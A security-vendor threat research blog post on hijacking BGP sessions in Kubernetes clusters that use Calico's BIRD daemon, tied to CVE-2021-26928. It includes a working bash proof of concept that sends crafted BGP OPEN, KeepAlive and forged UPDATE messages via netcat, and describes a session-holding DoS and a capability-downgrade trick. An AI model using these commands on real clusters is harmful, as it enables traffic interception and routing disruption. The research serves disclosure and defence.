

* [Developer](https://developer.cyberark.com/)
* [Events](https://www.cyberark.com/events/)
* [Marketplace](https://community.cyberark.com/marketplace/s/)
* [Partners](https://cyberark.com/partners/)
* [Careers](https://www.cyberark.com/careers/)

* [![](https://cihost.uberflip.com/cyberArk/favicon-update/assets/cyberark-logo.svg)](https://www.cyberark.com/)
* Why CyberArk

  + - [Identity Security Leader](https://www.cyberark.com/why-cyberark/)

      Security-forward identity and access management.

      [Why CyberArk](https://www.cyberark.com/why-cyberark/)
  + - [CyberArk Labs](https://labs.cyberark.com)

      The industry’s top talent proactively researching attacks and trends to keep you ahead.
    - [Blogs](https://www.cyberark.com/resources/all-blog-posts)

      Insights to help you move fearlessly forward in a digital world.
    - [Careers](https://careers.cyberark.com)

      Join a passionate team that is humbled to be a trusted advisor to the world's top companies.
* Platform

  + - [![cora thumbnail](https://www.cyberark.com/wp-content/uploads/2024/05/cora-ai-nav.png)CyberArk CORA AI™](https://www.cyberark.com/products/cora-ai/)

      CyberArk CORA AI™ is your central hub of identity security-focused artificial intelligence capabilities.

      [Learn More](https://www.cyberark.com/products/cora-ai/)
    - [Identity Security Platform](https://www.cyberark.com/products/)

      Put security first without putting productivity second.

      [Explore Platform](https://www.cyberark.com/products/)
  + - * + [Access Management](https://www.cyberark.com/products/access-management/)
        + [Workforce Access](https://www.cyberark.com/products/workforce-identity/)
          - [Single Sign-On](https://www.cyberark.com/products/single-sign-on/)
          - [Multi-Factor Authentication](https://www.cyberark.com/products/adaptive-multi-factor-authentication/)
          - [Workforce Password Management](https://www.cyberark.com/products/workforce-password-management/)
          - [Secure Web Sessions](https://www.cyberark.com/products/secure-web-sessions/)
          - [Secure Browser](https://www.cyberark.com/products/secure-browser/)
        + [Customer Access](https://www.cyberark.com/products/customer-identity/)
          - [B2B Identity](https://www.cyberark.com/products/b2b-identity/)
      * + [Identity Governance and Administration](https://www.cyberark.com/products/identity-management/)
        + [Identity Compliance](https://www.cyberark.com/products/identity-compliance/)
        + [Lifecycle Management](https://www.cyberark.com/products/lifecycle-management/)
        + [Identity Flows](https://www.cyberark.com/products/identity-flows/)
    - * + [Privileged Access](https://www.cyberark.com/products/privileged-access/)
        + [Privileged Access Management](https://www.cyberark.com/products/privileged-access-manager/)
        + [Vendor Privileged Access](https://www.cyberark.com/products/vendor-privileged-access-manager/)
      * + [Secrets Management](https://www.cyberark.com/products/secrets-management/)
        + [Multi-Cloud Secrets](https://www.cyberark.com/products/multi-cloud-secrets/)
        + [Secrets Hub](https://www.cyberark.com/products/secrets-hub/)
        + [Credential Providers](https://www.cyberark.com/products/credential-providers/)
      * + [Venafi Machine Identity Management](https://venafi.com/)
    - * + [Endpoint Privilege Security](https://www.cyberark.com/products/endpoint-privilege-security/)
        + [Endpoint Privilege Management](https://www.cyberark.com/products/endpoint-privilege-manager/)
        + [Secure Desktop](https://www.cyberark.com/products/secure-desktop/)
      * + [Secure Cloud Access](https://www.cyberark.com/products/secure-cloud-access/)
* Solutions

  + - [![cora thumbnail](https://www.cyberark.com/wp-content/uploads/2024/05/cora-ai-nav.png)CyberArk CORA AI™](https://www.cyberark.com/products/cora-ai/)

      CyberArk CORA AI™ is your central hub of identity security-focused artificial intelligence capabilities.

      [Learn More](https://www.cyberark.com/products/cora-ai/)
    - [Identity Security Offerings](https://www.cyberark.com/solutions/)

      Find the right CyberArk identity security solution for your organization.

      [Explore Solutions](https://www.cyberark.com/solutions/)
  + - * + Workforce
        + [Secure Your Workforce](https://www.cyberark.com/solutions/secure-your-workforce/)
        + [Secure High-Risk Users](https://www.cyberark.com/solutions/secure-high-risk-users/)
        + [Secure Your Desktops and Servers](https://www.cyberark.com/solutions/secure-your-desktops-and-servers/)
        + [Secure External Access](https://www.cyberark.com/solutions/secure-external-access/)
      * + IT
        + [Secure IT Administrators](https://www.cyberark.com/solutions/secure-it-admin-access/)
        + [Secure Cloud Operations Teams](https://www.cyberark.com/solutions/secure-cloud-operations/)
        + [Secure Your Desktops and Servers](https://www.cyberark.com/solutions/secure-your-desktops-and-servers/)
        + [Secure External Access](https://www.cyberark.com/solutions/secure-external-access/)
    - * + Developer
        + [Secure Developers](https://www.cyberark.com/solutions/secure-developers/)
        + [Secure Your Desktops and Servers](https://www.cyberark.com/solutions/secure-your-desktops-and-servers/)
      * + Machines
        + [Secure Cloud Workload Identities​](https://www.cyberark.com/solutions/secure-cloud-workload-identities/)
        + [Secure Secrets for Hybrid IT​](https://www.cyberark.com/solutions/secure-secrets-for-hybrid-it/)
        + [Secure Certificate Management and PKI](https://www.cyberark.com/solutions/secure-certificate-management-and-pki/)
    - * + Industries
        + [Automotive](https://www.cyberark.com/solutions/automotive/)
        + [Banking](https://www.cyberark.com/solutions/banking/)
        + [Critical Infrastructure](https://www.cyberark.com/solutions/critical-infrastructure/)
        + [Financial Services](https://www.cyberark.com/solutions/financial-services/)
        + [Government](https://www.cyberark.com/solutions/government/)
        + [Healthcare](https://www.cyberark.com/solutions/healthcare/)
        + [Insurance](https://www.cyberark.com/solutions/insurance/)
        + [Manufacturing](https://www.cyberark.com/solutions/manufacturing/)
* Services &
  Support
  + - [How Can We Help?](https://www.cyberark.com/services-support/)

      Expert guidance from strategy to implementation.

      [Services & Support](https://www.cyberark.com/services-support/)
  + - * Customer Success
      * [Customer Stories](https://www.cyberark.com/customer-stories/)
      * [CyberArk Blueprint](https://www.cyberark.com/blueprint/)
      * [Success Plans](https://www.cyberark.com/success-plans/)
    - * Learning
      * [Education Resources](https://www.cyberark.com/services-support/)
      * [Certification](https://www.cyberark.com/services-support/certification/)
      * [Training](https://www.cyberark.com/services-support/training/)
    - * Services
      * [Design & Deployment Services](https://www.cyberark.com/services-support/design-deployment/)
      * [Red Team Services](https://www.cyberark.com/services-support/red-team-services/)
      * [Remediation Services](https://www.cyberark.com/services-support/remediation/)
      * [Strategic Consulting Services](https://www.cyberark.com/services-support/strategic-consulting/)
    - * Support
      * [Product Documentation](https://docs.cyberark.com/)
      * [Technical Community](https://cyberark-customers.force.com/s/)
      * [Technical Support](https://www.cyberark.com/services-support/technical-support/)
* Company

  + - [Company](https://www.cyberark.com/company/)

      Our mission is to secure the world against cyber threats so together we can move fearlessly forward.

      [Learn About CyberArk](https://www.cyberark.com/company/)
  + - * About Us
      * [Leadership](https://www.cyberark.com/company/leadership/)
      * [Investor Relations](https://investors.cyberark.com/home/default.aspx)
      * [Environmental, Social and Governance](https://www.cyberark.com/company/esg/)
      * [Trust Center](https://www.cyberark.com/trust/)
      * [Life at CyberArk](https://www.cyberark.com/company/culture/)
      * [Careers](https://www.cyberark.com/careers/)
    - * Highlights
      * [Newsroom](https://www.cyberark.com/company/newsroom/)
      * [Events](https://www.cyberark.com/events/)
      * [Blog](https://www.cyberark.com/resources/all-blog-posts)
      * [Podcasts](https://www.cyberark.com/podcasts/)
      * [Customer Stories](https://www.cyberark.com/customer-stories/)
      * [CyberArk Labs](https://labs.cyberark.com/)
* Demos & Trials

  + - [Demos & Trials](https://www.cyberark.com/try-buy/)

      Get started with one of our 30-day trials.

      [Start a Trial](https://www.cyberark.com/try-buy/)
  + - [How to Buy](https://www.cyberark.com/how-to-buy/)

      Evaluate, purchase and renew CyberArk Identity Security solutions.
    - [Contact Us](https://www.cyberark.com/contact/)

      How can we help you move fearlessly forward?
    - [Identity Security Subscriptions](https://www.cyberark.com/identity-security-subscriptions/)

      Learn more about our subscription offerings.
* [Request a Demo](https://www.cyberark.com/request-demo/)
* [Blog](https://www.cyberark.com/resources/blog)
* [Partners](https://www.cyberark.com/partners/)
* [Marketplace](https://community.cyberark.com/marketplace/s/)
* [Careers](https://www.cyberark.com/careers/)
* Menu Item
  ![](https://www.cyberark.com/wp-content/uploads/2020/12/Icons-Globe@2x.png)
  + [Deutsch](https://www.cyberark.com/de)
  + [Français](https://www.cyberark.com/fr)
  + [Italiano](https://www.cyberark.com/it)
  + [Español](https://www.cyberark.com/es)
  + [日本語](https://www.cyberark.com/ja)
  + [简体中文](https://www.cyberark.com/zh-hans)
  + [繁體中文](https://www.cyberark.com/zh-hant)
  + [한국어](https://www.cyberark.com/ko/)

English – CyberArk Software Inc
## Up Your Security I.Q. by Checking Out Our Collection of Curated Resources.

![loading](https://content.cdntwrk.com/img/hubs/ajax-loader-white-2x.gif?v=19a554b579c4)

[English – CyberArk Software Inc](https://www.cyberark.com/resources "English – CyberArk Software Inc")

* Products & Services
  + Products & Services
  + [Cloud Security](https://www.cyberark.com/resources/cloud-security)
  + [Customer Access](https://www.cyberark.com/resources/customer-access)
  + [Endpoint Privilege Security](https://www.cyberark.com/resources/endpoint-privilege-security)
  + [Identity Management](https://www.cyberark.com/resources/identity-management)
  + [Privileged Access Management](https://www.cyberark.com/resources/privileged-access-management)
  + [Secrets Management](https://www.cyberark.com/resources/secrets-management)
  + [Services & Support​](https://www.cyberark.com/resources/services-support)
  + [Shared Services](https://www.cyberark.com/resources/shared-services)
  + [Workforce Access](https://www.cyberark.com/resources/workforce-access)
* Topics
  + Topics
  + [Access Management](https://www.cyberark.com/resources/access-management)
  + [Best Practices](https://www.cyberark.com/resources/best-practices)
  + [DevSecOps](https://www.cyberark.com/resources/devsecops)
  + [Endpoint Security](https://www.cyberark.com/resources/endpoint-security)
  + [Hybrid and Multi-Cloud Security](https://www.cyberark.com/resources/hybrid-and-multi-cloud-security)
  + [Identity Security](https://www.cyberark.com/resources/identity-security)
  + [IT Security Audit and Compliance](https://www.cyberark.com/resources/it-security-audit-and-compliance)
  + [Least Privilege](https://www.cyberark.com/resources/least-privilege)
  + [Partners](https://www.cyberark.com/resources/partners)
  + [Ransomware Protection](https://www.cyberark.com/resources/ransomware-protection)
  + [Remote Access](https://www.cyberark.com/resources/remote-access)
  + [Robotic Process Automation](https://www.cyberark.com/resources/robotic-process-automation)
  + [Threat Research​](https://www.cyberark.com/resources/threat-research)
  + [Zero Trust](https://www.cyberark.com/resources/zero-trust)
* Industry
  + Industry
  + [Federal](https://www.cyberark.com/resources/federal)
  + [Financial Services](https://www.cyberark.com/resources/financial-services)
  + [Healthcare​](https://www.cyberark.com/resources/healthcare)
  + [Higher Education](https://www.cyberark.com/resources/higher-education)
  + [Insurance](https://www.cyberark.com/resources/insurance)
  + [Manufacturing](https://www.cyberark.com/resources/manufacturing)
* Content Type
  + Content Type
  + [Analyst Reports](https://www.cyberark.com/resources/analyst-reports)
  + [Blog Articles](https://www.cyberark.com/resources/all-blog-posts)
  + [Customer Stories](https://www.cyberark.com/customer-stories/)
  + [eBooks​](https://www.cyberark.com/resources/ebooks)
  + [Executive Insights](https://www.cyberark.com/resources/executive-insights)
  + [Infographics​](https://www.cyberark.com/resources/infographics)
  + [Podcasts](https://www.cyberark.com/podcasts/)
  + [Product Announcements](https://www.cyberark.com/resources/product-announcements)
  + [Product Datasheets​](https://www.cyberark.com/resources/product-datasheets)
  + [Solution Briefs​](https://www.cyberark.com/resources/solution-briefs)
  + [Tools & Blueprints](https://www.cyberark.com/resources/tools-blueprints)
  + [Webinars](https://www.cyberark.com/resources/webinars)
  + [Videos](https://www.cyberark.com/resources/videos)
  + [Whitepapers​](https://www.cyberark.com/resources/white-papers)

×

[Home](https://www.cyberark.com/resources)
»
[Threat Research Blog](https://www.cyberark.com/resources/threat-research-blog)
»
Attacking Kubernetes Clusters Through Your Network Plumbing: Part 2

×
Share this Article

* [Facebook](https://www.facebook.com/sharer/sharer.php?u=https://www.cyberark.com/resources/threat-research-blog/attacking-kubernetes-clusters-through-your-network-plumbing-part-2)
* [Twitter](https://twitter.com/share?text=Attacking Kubernetes Clusters Through Your Network Plumbing: Part 2&url=https://www.cyberark.com/resources/threat-research-blog/attacking-kubernetes-clusters-through-your-network-plumbing-part-2)
* [Email](/cdn-cgi/l/email-protection#dce3afa9beb6b9bfa8e19fb3b2a8b9b2a8fcbaaeb3b1fcb1a5fc94a9befdfabdb1ace7beb3b8a5e19fb4b9bfb7fcb3a9a8fcabb4bda8faffecefe5e7affcb4bdacacb9b2b5b2bbfcbda8fc9fa5beb9ae9daeb7fd80b280b29da8a8bdbfb7b5b2bbfc97a9beb9aeb2b9a8b9affc9fb0a9afa8b9aeaffc88b4aeb3a9bbb4fc85b3a9aefc92b9a8abb3aeb7fc8cb0a9b1beb5b2bbe6fc8cbdaea8fcee80b295b2fc8cbdaea8fcedfcb3bafca8b4b5affcbeb0b3bbfcacb3afa8f0fcabb9fcb8b5afbfa9afafb9b8fcbda8a8bdbfb7fcaab9bfa8b3aeaffca8b4bda8fca9a8b5b0b5a6b9fca8b4b9fcb8b5babab9aeb9b2a8fcbab9bda8a9aeb9affcb3bafca8b4b9fcb8b9aab5bfb9affca8b4bda8fcb2b9a8abb3aeb7fcacb0a9bbb5b2affca9afb9f0fcafa9bfb4fcbdaffcbeaeb5b8bbb9fcb8b9aab5bfb9affcbdb2b8fca8a9b2b2b9b0b5b2bbfcb8b9aab5bfb9affcf48a84909d92fcb5b2f2f2f280b280b2b4a8a8acafe6f3f3abababf2bfa5beb9aebdaeb7f2bfb3b1f3aeb9afb3a9aebfb9aff3a8b4aeb9bda8f1aeb9afb9bdaebfb4f1beb0b3bbf3bda8a8bdbfb7b5b2bbf1b7a9beb9aeb2b9a8b9aff1bfb0a9afa8b9aeaff1a8b4aeb3a9bbb4f1a5b3a9aef1b2b9a8abb3aeb7f1acb0a9b1beb5b2bbf1acbdaea8f1ee)
* [LinkedIn](https://www.linkedin.com/shareArticle?mini=true&url=https://www.cyberark.com/resources/threat-research-blog/attacking-kubernetes-clusters-through-your-network-plumbing-part-2&title=Attacking Kubernetes Clusters Through Your Network Plumbing: Part 2&summary=In Part 1 of this blog post, we discussed attack vectors that utilize the different features of the devices that network plugins use, such as bridge devices and tunneling devices (VXLAN in...)

# Attacking Kubernetes Clusters Through Your Network Plumbing: Part 2

May 17, 2021
Nir Chako

* Share this Article
* [Facebook](https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fwww.cyberark.com%2Fresources%2Fthreat-research-blog%2Fattacking-kubernetes-clusters-through-your-network-plumbing-part-2)
* [Twitter](https://twitter.com/share?text=Attacking%20Kubernetes%20Clusters%20Through%20Your%20Network%20Plumbing%3A%20Part%202&url=https%3A%2F%2Fwww.cyberark.com%2Fresources%2Fthreat-research-blog%2Fattacking-kubernetes-clusters-through-your-network-plumbing-part-2&via=CyberArk)
* [Email](/cdn-cgi/l/email-protection#8db2fef8efe7e8eef9b0cee2e3f9e8e3f9a8bfbdebffe2e0a8bfbde0f4a8bfbdc5f8efa8bfbcabece0fdb6efe2e9f4b0cee5e8eee6a8bfbde2f8f9a8bfbdfae5ecf9a8bfbafea8bfbde5ecfdfde8e3e4e3eaa8bfbdecf9a8bfbdcef4efe8ffccffe6a8bfbca8bdcca8bdccccf9f9eceee6e4e3eaa8bfbdc6f8efe8ffe3e8f9e8fea8bfbdcee1f8fef9e8fffea8bfbdd9e5ffe2f8eae5a8bfbdd4e2f8ffa8bfbdc3e8f9fae2ffe6a8bfbddde1f8e0efe4e3eaa8becca8bfbdddecfff9a8bfbdbfa8bdccc4e3a8bfbdddecfff9a8bfbdbca8bfbde2eba8bfbdf9e5e4fea8bfbdefe1e2eaa8bfbdfde2fef9a8bfcea8bfbdfae8a8bfbde9e4feeef8fefee8e9a8bfbdecf9f9eceee6a8bfbdfbe8eef9e2fffea8bfbdf9e5ecf9a8bfbdf8f9e4e1e4f7e8a8bfbdf9e5e8a8bfbde9e4ebebe8ffe8e3f9a8bfbdebe8ecf9f8ffe8fea8bfbde2eba8bfbdf9e5e8a8bfbde9e8fbe4eee8fea8bfbdf9e5ecf9a8bfbde3e8f9fae2ffe6a8bfbdfde1f8eae4e3fea8bfbdf8fee8a8bfcea8bfbdfef8eee5a8bfbdecfea8bfbdefffe4e9eae8a8bfbde9e8fbe4eee8fea8bfbdece3e9a8bfbdf9f8e3e3e8e1e4e3eaa8bfbde9e8fbe4eee8fea8bfbda8bfb5dbd5c1ccc3a8bfbde4e3a3a3a3a8bdcca8bdcce5f9f9fdfea8becca8bfcba8bfcbfafafaa3eef4efe8ffecffe6a3eee2e0a8bfcbffe8fee2f8ffeee8fea8bfcbf9e5ffe8ecf9a0ffe8fee8ecffeee5a0efe1e2eaa8bfcbecf9f9eceee6e4e3eaa0e6f8efe8ffe3e8f9e8fea0eee1f8fef9e8fffea0f9e5ffe2f8eae5a0f4e2f8ffa0e3e8f9fae2ffe6a0fde1f8e0efe4e3eaa0fdecfff9a0bf)
* [LinkedIn](https://www.linkedin.com/shareArticle?mini=true&url=https%3A%2F%2Fwww.cyberark.com%2Fresources%2Fthreat-research-blog%2Fattacking-kubernetes-clusters-through-your-network-plumbing-part-2&title=Attacking%20Kubernetes%20Clusters%20Through%20Your%20Network%20Plumbing%3A%20Part%202&summary=In%20Part%201%20of%20this%20blog%20post%2C%20we%20discussed%20attack%20vectors%20that%20utilize%20the%20different%20features%20of%20the%20devices%20that%20network%20plugins%20use%2C%20such%20as%20bridge%20devices%20and%20tunneling%20devices%20%28VXLAN%20in...)

![One way road sign in the city](https://www.cyberark.com/wp-content/uploads/2021/05/One-Way-Alternate.jpeg)

In [Part 1 of this blog post](https://www.cyberark.com/resources/threat-research-blog/attacking-kubernetes-clusters-through-your-network-plumbing-part-1), we discussed attack vectors that utilize the different features of the devices that network plugins use, such as bridge devices and tunneling devices (VXLAN in particular).

In this second part, we’ll discuss one of the most important aspects of network plugins: the responsibility of setting and updating the routing data.

There are multiple ways of updating the routing data. Some network plugins use [Kubernetes annotations](https://kubernetes.io/docs/concepts/overview/working-with-objects/annotations/) to share updates; some rely on the cloud provider’s routing functionality and **some use routing daemons** (such as BIRD, bgpd, GoBGP, etc.) to distribute routing updates with protocols such as BGP (Border Gateway Protocol) and OSPF (Open Shortest Path First).

From the perspective of the attacker, gaining control over the routing updates is a great achievement. Such an attacker can use it for a stealthy MiTM attack on a broad multi-subnet network, and it’s much harder to detect compared to a LAN based easy-to-detect method such as ARP spoofing.

## TL;DR

* **This research led to** **CVE-2021-26928 and a BGP RFC update.** We found a way to hijack the BGP session in Calico’s architecture and a logical flaw in BGP [RFC4724](https://tools.ietf.org/html/rfc4724) that led to a security issue allowing persistent BGP hijacking.
* **Routing daemons on Kubernetes clusters are different than the internet infrastructure in their threat model**. These are no longer standard networks in which routing components are hardened with degenerate capabilities. This is a complete operating system with third-party products installed, and in fact, all the standard attack vectors are valid to gain a grip on the routing mechanisms.
* **Network plugins that leverage BGP routing daemons should implement a secure configuration to minimize their attack surface.** TCP-MD5, for example, is a significant mitigation technique for various attack vectors on the BGP protocol.

## Abusing Routing Protocols in Kubernetes Environments

In this section, you will see how aforementioned routing daemons can be attacked in order to place any machine, on-premises — or even in the cloud — as a cluster MiTM.

This time, I’ll use [Calico](https://www.projectcalico.org/) as the network plugin for these examples. **Calico** is a network daemon that runs on every Kubernetes node as a pod. One of the key components in Calico’s pod is the [BIRD routing daemon](https://bird.network.cz/). **BIRD** is an internet routing daemon and **is responsible for picking up the kernel route data and distributing it to BGP peers on the network**.

Before we continue with the explanation of the attack vector, let’s say a few words about BGP.

Since there are far too many details to get into, I’ll just focus on the ones that are most relevant to this section.

### BGP

BGP is a path-vector routing protocol, which means it knows the **full** **path** from point A to point B. It’s the standard for internet routing and is required by most internet service providers (ISPs) to establish routing between one another.

A BGP session would look something like this:

#####

***Figure.1 – BGP session establishment***

As you can see, there must be a full TCP 3-way-handshake before any of the BGP messages.

In Calico’s architecture, BIRD uses a configuration file that is built on information from etcd (using [confd](https://github.com/projectcalico/confd)) that allows only known cluster peers (worker nodes) to set up a TCP connection with it. Otherwise, it’ll just send a TCP RST packet. Then, after the TCP 3-way-handshake, the BGP session starts with an **OPEN Message** where each peer shares with the other peer its identifiers and the BGP capabilities it would like to activate.

I would describe BGP capabilities as a collection of features that the peer supports.

For example, one capability would be Multiprotocol Extensions for BGP-4.

If one peer sends the second peer this capability as part of the OPEN message, it states, “I would like to share with you not only IPv4 routing information but also multiple other network-layer protocols (such as IPv6).”

After establishing the connection, the peers will send each other a **KeepAlive message**.

They will continue to send it to each other within a predefined time period in the OPEN message.

The “heart” of the protocol would be the **UPDATE message** that carries the routing updates.

That’s the way one peer tells the other, “If you are looking for subnet a.b.c.d/24, you can send it to me. Path X can get you there.”

[![](https://www.cyberark.com/wp-content/uploads/2021/05/2.png)](https://www.cyberark.com/wp-content/uploads/2021/05/2.png)

***Figure.2 – BGP UPDATE message***

Last, but not least, is the **NOTIFICATION message**.

NOTIFICATION messages are the way BGP informs your BGP peers about an issue. It includes a major and minor error code (a full list of the error codes can be found [here](https://www.iana.org/assignments/bgp-parameters/bgp-parameters.xhtml#bgp-parameters-3)). For example, if one daemon is being deliberately shut-down, it’ll notify its peers about it.

[![](https://www.cyberark.com/wp-content/uploads/2021/05/3.png)](https://www.cyberark.com/wp-content/uploads/2021/05/3.png)

***Figure.3 – BGP NOTIFICATION message***

Going back to the security aspect, it’s important to be familiar with a well-known BGP attack called **BGP hijacking**. It occurs when an attacker succeeds in hijacking the session and injects a routing update to the network. When the injected routing information is more specific than current information, it appears like this, for example:

1. Current information – a.b.0.0/16
2. Injected information – a.b.c.0/24

BGP assumes that the more specific route is more accurate and more reliable, so the more specific route will “win” the routing decision, granting the attacker the ability to control the data flow for this subnet.

Only a true BGP peer can submit a routing update, and BGP peers are able to establish a connection only if they are configured to do so. So, an attacker trying to perform BGP hijacking will rely on one of the following to become a proper peer:

1. There was an operator mistake that allows the attacker to impersonate a legitimate peer.
2. One of the peers was compromised and is now under the control of an attacker.

Most of the BGP hijacking events that occurred on the internet were of Type 1 — due to an operator misconfiguration. Type 2 is a rarer case. On the internet, BGP daemons are actually routers that aren’t necessarily accessible to various types of attacks.

**In Kubernetes clusters, the situation is different.**

The BGP routing daemon resides on all of the nodes as part of a full operating system that provides a variety of services and is, therefore, more vulnerable to possible attack vectors.

That makes Type 2 — an attacker-controlled BGP peer — a much more likely scenario. Let’s see how attackers who gained access to your Kubernetes environment can run a BGP hijacking attack in order to place their server in a MiTM position of the cluster.

**Prerequisites**

1. A low-privileged user on a node (master/worker) or on a pod with host network namespace. For example:
   1. An attacker who is running an RCE on your node’s SCOM agent
   2. An attacker who got access to a pod with [HostNetwork configured](https://kubernetes.io/docs/concepts/policy/pod-security-policy/#host-namespaces)

[![](https://www.cyberark.com/wp-content/uploads/2021/05/4.png)](https://www.cyberark.com/wp-content/uploads/2021/05/4.png)

***Figure.4 – An abstraction of node network architecture when using Calico as Kubernetes network plugin***

### Simple DoS

To run a simple route distribution DoS, it’s enough to steal the TCP session. By “steal” we mean opening a TCP session with the targeted BGP peer. That’s it; there’s no need to send any data. Calico’s BGP daemon — [BIRD](https://bird.network.cz/) — as configured, allows you to do that pretty easily. It will give you a full two minutes, whereas the original valid BGP daemon on the peer you’re on won’t be able to reestablish the connection. If two minutes isn’t enough, you can just do the same trick over and over again…

[![](https://www.cyberark.com/wp-content/uploads/2021/05/5.png)](https://www.cyberark.com/wp-content/uploads/2021/05/5.png)

***Figure.5 – Simple DoS attack using Netcat***

![](https://www.cyberark.com/wp-content/uploads/2021/05/6.png)

***Figure.6 – Explanation of the DoS attack flow***

But, of course, if you can already steal the TCP session, why not just hijack the BGP session?

### BGP Hijacking and Gaining MiTM Position

In order to hijack the session, the attacker would send a BGP packet sequence of:

1. OPEN – opens the BGP session
2. KeepAlive
3. Update – update routing data between peers (Kubernetes nodes in that case)

If the UPDATE message includes a forged NEXT\_HOP value with a “better route,”— a more specific subnet A.B.C.0/24 instead of A.B.0.0/16, for example — we can manipulate the receiving peer to send packets wherever we want — even outside of the cluster.

Let’s look at this architecture to talk about things in a more practical way.

[![](https://www.cyberark.com/wp-content/uploads/2021/05/7.png)](https://www.cyberark.com/wp-content/uploads/2021/05/7.png)

***Figure.7 – BGP hijacking attack scenario***

As a PoC, we will place the attacker-controlled server as a MiTM for Google’s DNS IP (8.8.8.8).

We can do that by using these easy-to-use bash commands.

***Please note that within the code snippets below there are tagged sections that include explanations. In order for the script to run properly these tags must be deleted before running.*

*The tags will be in the following structure –*

<#> Start of tagging

</#> End of tagging**

```
# Setting up the TCP connection with the Master node

tmpd=`mktemp -d`

tmpf="$tmpd"/fifo

mkfifo "$tmpf"

nc 192.168.198.170 179 < "$tmpf" &

# OPEN Message

# ! NOTE - The tagged parts are the BGP AS (\xfc\x00 => 64512) and the BGP ID (\xc0\xa8\xc6\xab => 192.168.198.171)

echo -ne '\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\x00\x3f\x01\x04<#>\xfc\x00</#>\x00\xf0<#>\xc0\xa8\xc6\xab</#>\x22\x02\x20\x01\x04\x00\x01\x00\x01\x02\x00\x40\x06\x80\x78\x00\x01\x01\x80\x41\x04\x00\x00\xfc\x00\x45\x04\x00\x01\x01\x03\x46\x00\x47\x00' > $tmpf

```

[![](https://www.cyberark.com/wp-content/uploads/2021/05/8.png)](https://www.cyberark.com/wp-content/uploads/2021/05/8.png)

***Figure.8 – BGP OPEN message***

```
# KeepAlive Message

echo -ne '\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\x00\x13\x04' > $tmpf

```

[![](https://www.cyberark.com/wp-content/uploads/2021/05/9.png)](https://www.cyberark.com/wp-content/uploads/2021/05/9.png)

***Figure.9 – BGP KeepAlive message***

```
# UPDATE Messages

# ! NOTE - The tagged parts are the NEXT_HOP (\xc0\xa8\xc6\xa1 -> 192.168.198.161), the PathID we chose (\x00\x00\x00\x03 -> 3)  and the affected subnet (\x20\x08\x08\x08\x08 -> 8.8.8.8/32)

echo -ne '\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\x00\x46\x02\x00\x00\x00\x15\x40\x01\x01\x00\x40\x02\x00\x40\x03\x04<#>\xc0\xa8\xc6\xa1</#>\x40\x05\x04\x00\x00\x00\x64\x00\x00\x00\x02\x1a\xc0\xa8\x68\x00\x00\x00\x00\x05\x18\xc0\xa8\xc6<#>\x00\x00\x00\x03</#><#>\x20\x08\x08\x08\x08</#>' > $tmpf

```

[![](https://www.cyberark.com/wp-content/uploads/2021/05/10.png)](https://www.cyberark.com/wp-content/uploads/2021/05/10.png)

***Figure.10 – BGP manipulated UPDATE message with false routing data***

```
echo -ne '\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\x00\x17\x02\x00\x00\x00\x00' > $tmpf

```

[![](https://www.cyberark.com/wp-content/uploads/2021/05/11.png)](https://www.cyberark.com/wp-content/uploads/2021/05/11.png)

***Figure.11 – BGP UPDATE message***

There are several parameters we notice when running this attack:

1. An OPEN message should include specific parameters:

**My AS** – Calico’s default is 64512

**AS (**Autonomous System) –  a collection of connected IP routing prefixes under the control of one or more network operators

**BGP Identifier** – the source IP address

[![](https://www.cyberark.com/wp-content/uploads/2021/05/12.png)](https://www.cyberark.com/wp-content/uploads/2021/05/12.png)

***Figure.12 – BGP OPEN message most relevant fields***

2. An UPDATE message should include:

**The “new” NEXT\_HOP** – the IP of the MiTM machine

**The “new and better” destination subnet** –  in our PoC 8.8.8.8/32

[![](https://www.cyberark.com/wp-content/uploads/2021/05/13.png)](https://www.cyberark.com/wp-content/uploads/2021/05/13.png)

***Figure13 – BGP UPDATE message most relevant fields***

While running these attack steps and opening Wireshark on the attacker-controlled server (MiTM), we notice that after just a few packets, the connection returns to its original state. That’s because the valid connection “stole” the session back pretty quickly.

[![](https://www.cyberark.com/wp-content/uploads/2021/05/14.png)](https://www.cyberark.com/wp-content/uploads/2021/05/14.png)

***Figure.14 – The valid session reestablishing its session***

If you’ll look at the BGP session, you’ll see:

[![](https://www.cyberark.com/wp-content/uploads/2021/05/15.png)](https://www.cyberark.com/wp-content/uploads/2021/05/15.png)

***Figure.15 – The full flow of this attack scenario***

It’s enough as a PoC, but we wanted to achieve a persistent BGP session. This unknowingly led us to uncover an overlooked security issue in one of BGP’s RFCs: [RFC4724](https://tools.ietf.org/html/rfc4724), Graceful Restart Mechanism for BGP.

### BGP Hijacking Persistence

Before we continue, let’s see why we were able to hijack the session in the first place. The possibility for a second TCP session to gain a hold on the session is due to the graceful restart capability that is configured as part of the OPEN message:

[![](https://www.cyberark.com/wp-content/uploads/2021/05/16.png)](https://www.cyberark.com/wp-content/uploads/2021/05/16.png)

***Figure.16 – BGP OPEN message “Graceful Restart Capability”***

The graceful restart capability dictates, among other things, that in case of receiving a second TCP connection from the same peer, it will act as follows:

[![](https://www.cyberark.com/wp-content/uploads/2021/05/17.png)](https://www.cyberark.com/wp-content/uploads/2021/05/17.png)

***Figure.17 – RFC 4724, behavior of BGP connection when using “Graceful Restart Capability”***

That’s pretty straight forward. The Graceful Restart Capability changes the BGP FSM (Finite State Machine) so that a new TCP session drops the ESTABLISHED connection.

This is highlighted as a security issue in the same RFC:

[![](https://www.cyberark.com/wp-content/uploads/2021/05/18.png)](https://www.cyberark.com/wp-content/uploads/2021/05/18.png)

***Figure.18 – RFC 4724, “Graceful Restart Capability” security considerations***

It’s tricky, because on the one hand it becomes our advantage and allows us to hijack the session; on the other hand, it prevents us from achieving persistency over the BGP connection.

Here we come down to the security issue that was overlooked. An attacker can use a NOTIFICATION message with the Unsupported Optional Parameter error code to downgrade the BGP session by causing the receiving peer to strip their capabilities.

[![](https://www.cyberark.com/wp-content/uploads/2021/05/19.png)](https://www.cyberark.com/wp-content/uploads/2021/05/19.png)

***Figure.19 – BGP “Unsupported Optional Parameter” NOTIFICATION message***

After sending this NOTIFICATION message, the receiving side will try to reestablish the session without any capabilities, including the graceful-restart capability we wanted out of there.

